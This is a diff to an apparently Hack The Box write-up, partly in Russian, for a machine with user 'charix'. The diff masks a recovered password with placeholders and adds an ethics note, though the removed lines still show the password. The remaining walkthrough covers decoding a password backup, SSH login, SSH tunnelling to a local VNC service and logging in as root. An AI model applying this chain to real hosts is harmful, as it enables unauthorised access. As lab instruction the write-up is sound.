@@ -29,16 +29,18 @@ Lateral Movement (Credentials)
 ├── /var/log/httpd-access.log (Apache access log path)
 ├── ps -aux → Xvnc :1 (root)
 ├── /usr/local/www/apache24/data/pwdbackup.txt
-│   └── 13x base64 decode → Charix!2#4%6&8(0
+│   └── 13x base64 decode → <PASSWORD>
 └── ssh charix@10.129.1.254 → user.txt
 
 Privilege Escalation (VNC)
-├── ~/secret.zip → scp → unzip (pass: Charix!2#4%6&8(0)
+├── ~/secret.zip → scp → unzip (pass: <PASSWORD>)
 ├── netstat -an | grep LIST → 5801, 5901 (VNC localhost)
 ├── ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
 ├── proxychains4.conf → socks5 127.0.0.1 1080
 └── vncviewer -passwd secret 127.0.0.1::6901 → root.txt
 ```
+
+> Note: All flags, passwords, and hashes have been masked for ethical reasons.
 
 ---
 
@@ -148,13 +150,13 @@ for i in $(seq 1 13); do cat pwdbackup.txt | base64 -d > /tmp/step; mv /tmp/step
 cat pwdbackup.txt
 ```
 
-Результат: `Charix!2#4%6&8(0`.
+Результат: `<PASSWORD>`.
 
 ### SSH
 
 ```bash
 ssh charix@10.129.1.254
-# Password: Charix!2#4%6&8(0
+# Password: <PASSWORD>
 cat user.txt
 # <USER_FLAG>
 ```
@@ -170,7 +172,7 @@ ls
 # secret.zip
 scp charix@10.129.1.254:secret.zip .
 unzip secret.zip
-# пароль: Charix!2#4%6&8(0
+# пароль: <PASSWORD>
 ```
 
 Внутри - бинарные данные (пароль VNC).
